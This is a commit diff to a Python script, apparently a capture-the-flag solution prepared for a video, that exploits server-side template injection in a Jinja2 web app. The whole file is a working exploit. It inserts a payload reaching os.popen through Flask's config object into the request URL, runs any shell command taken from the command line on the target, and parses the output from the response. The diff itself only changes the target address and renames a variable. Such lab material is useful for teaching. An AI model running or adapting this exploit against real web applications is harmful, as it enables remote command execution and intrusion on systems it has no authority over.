4de0953d05f30e82be7df4c89980fdc0c3909dc4
Jarrod <me@jarrodrizor.com>
2026-05-11 23:51:44 -0400

    Update Templated.py
    Final for the video

--- Web/Templated.py
+++ Web/Templated.py
@@ -1,10 +1,9 @@
 import requests
 import sys
 from bs4 import BeautifulSoup
-from urllib.parse import quote
 
-server = "154.57.164.79"
-port = 30591
+server = "154.57.164.66"
+port = 31609
 url = f"http://{server}:{port}/"
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
@@ -13,12 +12,9 @@ if len(sys.argv) < 2:
     sys.exit(-1)
 
 cmd = " ".join(sys.argv[1:]).strip()
+payload = "{{ config.__class__.from_envvar.__globals__.import_string('os').popen('"+cmd+"').read() }}"
 
-ssti_payload = "{{ config.__class__.from_envvar.__globals__.import_string('os').popen('"+cmd+"').read() }}"
-#payload = ssti_payload.replace("cmd", cmd)
-
-response = requests.get(url + ssti_payload, proxies=proxies).text
+response = requests.get(url + payload, proxies=proxies).text
 soup = BeautifulSoup(response, "html.parser")
 output = soup.find("str")
-
 print(output.text)
